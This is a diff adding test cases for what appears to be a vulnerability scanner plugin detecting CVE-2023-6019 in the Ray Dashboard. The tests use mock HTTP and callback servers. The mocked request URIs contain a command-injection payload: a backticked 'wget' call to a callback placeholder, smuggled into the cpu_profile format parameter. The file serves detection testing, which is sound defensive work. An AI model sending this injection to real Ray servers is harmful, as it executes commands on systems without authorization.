@@ -1,0 +1,78 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Ray_CVE_2023_6019"
+}
+
+tests: {
+  name: "whenOobVulnerable_returnsVuln"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/worker/cpu_profile?pid=1&duration=5&native=0&format=`wget%20-qO-%20{{ T_CBS_URI }}`"
+        status: 200
+        body_content: 
+          '...'
+      },
+      {
+        uri: "/"
+        status: 200
+        body_content: 
+          '... <title>Ray Dashboard</title> ...'
+      }
+    ]
+  }
+}
+
+
+tests: {
+  name: "whenOobNotVulnerable_returnsNotVuln"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/worker/cpu_profile?pid=1&duration=5&native=0&format=`wget%20-qO-%20{{ T_CBS_URI }}`"
+        status: 200
+        body_content: 
+          '...'
+      },
+      {
+        uri: "/"
+        status: 200
+        body_content: 
+          '... <title>Ray Dashboard</title> ...'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenRandomServer_returnsFalse"
+  expect_vulnerability: false
+
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
+
